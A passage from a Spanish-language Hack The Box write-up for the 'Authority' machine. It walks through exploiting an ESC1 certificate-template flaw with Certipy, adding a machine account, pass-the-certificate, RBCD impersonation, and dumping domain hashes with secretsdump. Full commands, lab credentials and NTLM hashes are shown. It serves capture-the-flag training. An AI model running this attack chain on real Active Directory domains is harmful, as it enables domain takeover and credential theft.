                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

- Y bueno nos reporta ESC1 en CorpVPN <https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8> antes de explotar eso necesitamos agregar un computer account.

- Si verificamos cuantas cuentas de equipo puede crear un usuario normal sin privilegios administrativos vemos que 10 así que no tendremos problemas.

```bash
❯ cme ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
```

- Vamos agregar la computadora.

```bash
❯ impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name 'miguel' -computer-pass 'miguel123' -dc-ip 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Successfully added machine account miguel$ with password miguel123.
```

- Sincronizamos nuestro reloj con el del dominio. 

```bash
❯ sudo ntpdate 10.10.11.222
```

- Ahora vamos a obtener el certificado.

```bash
❯ certipy req -username 'miguel$' -password miguel123 -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'
```

- Ahora solicitamos el `hash` del administrador.

```bash
❯ certipy auth -pfx administrator_authority.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@authority.htb'
    [1] DNS Host Name: 'authority.htb'
> 0
[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@authority.htb': aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
```

- Son credenciales validas.

```bash
❯ cme winrm 10.10.11.222 -u administrator -H '6961f422924da90a6928197429eea4ed'
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\administrator:6961f422924da90a6928197429eea4ed (Pwn3d!)
```

- Nos podemos conectar.

```bash
❯ evil-winrm -i 10.10.11.222 -u administrator -H '6961f422924da90a6928197429eea4ed'
                                   
Evil-WinRM shell v3.5
                                   
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                   
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                   
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
6f14e5def2f1681729325fa02fcbefb5
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

- En caso de que no pudieras solicitar el hash puedes emplear este ataque <https://github.com/AlmondOffSec/PassTheCert>.

- Para esto necesitamos la `key` y un certificado.

```bash
❯ certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator.key'
```

```bash
❯ certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator.crt'
```

- Ahora usamos la herramienta.

- Lo que estamos haciendo es añadiendo al usuario svc_ldap al grupo Administrators.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 exit - Terminates this session.

# add_user_to_group svc_ldap administrators
Adding user: svc_ldap to group Administrators result: OK
```

- Ahora podemos dumpear los hashes como el del administrador para conectarnos.

```bash
❯ crackmapexec smb 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --sam
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
SMB         10.10.11.222    445    AUTHORITY        [+] Dumping SAM hashes
SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:a15217bb5af3046c87b5bb6afa7b193e:::
SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.222    445    AUTHORITY        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
SMB         10.10.11.222    445    AUTHORITY        [+] Added 3 SAM hashes to the database
```

- Por alguna razón el hash que nos da `crackmapexec` no es correcto pero podemos solicitarlo de otra forma.

- Vamos a usar write_rbcd para darle permisos de `delegration` sobre el DC.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'miguel$' -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] miguel$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     miguel$      (S-1-5-21-622327497-3269355298-2248959698-11602)
```

>Se refiere a la capacidad de un usuario, grupo o computadora para delegar su autoridad o permisos a otro usuario, grupo o computadora. Esto es especialmente relevante en entornos de red y dominio donde es común delegar ciertos permisos administrativos a usuarios o equipos específicos para realizar tareas específicas sin otorgar acceso completo.

- Ahora obtenemos el ticket.

```bash
❯ impacket-getST -spn 'cifs/AUTHORITY.AUTHORITY.HTB' -impersonate Administrator 'authority.htb/miguel$:miguel123'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
```

- Y ahora si obtenemos los hashes.

```bash
❯ KRB5CCNAME=Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache impacket-secretsdump -k -no-pass authority.htb/administrator@authority.authority.htb -just-dc-ntlm
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:42e6e4d7486c17cbc44fd23c758d39d1:::
miguel$:11602:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
[*] Cleaning up...
```

- Ahora si ya nos pudimos conectar.

```bash
❯ evil-winrm -i authority.htb -u administrator -H 6961f422924da90a6928197429eea4ed

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

- Recomiendo el writeup de mi amigo y compañero Soqui :) .

<iframe width="560" height="315" src="https://www.youtube.com/embed/5L0rHK3Ik54?si=AD5c9-hS52h_QD-0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
